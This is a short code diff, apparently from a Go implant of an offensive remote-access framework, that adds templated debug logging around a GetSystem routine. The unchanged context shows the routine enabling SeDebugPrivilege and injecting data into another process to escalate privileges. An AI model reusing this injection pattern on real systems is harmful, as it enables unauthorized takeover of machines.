@@ -349,9 +349,15 @@ func GetSystem(data []byte) (err error) {
 			defer runtime.UnlockOSThread()
 			err = enableCurrentThreadPrivilege("SeDebugPrivilege")
 			if err != nil {
+				// {{if .Debug}}
+				log.Println("EnableCurrentThreadPrivilege failed:", err)
+				// {{end}}
 				return
 			}
 			err = taskrunner.RemoteTask(p.Pid, data)
+			// {{if .Debug}}
+			log.Println("RemoteTask failed:", err)
+			// {{end}}
 			break
 		}
 	}
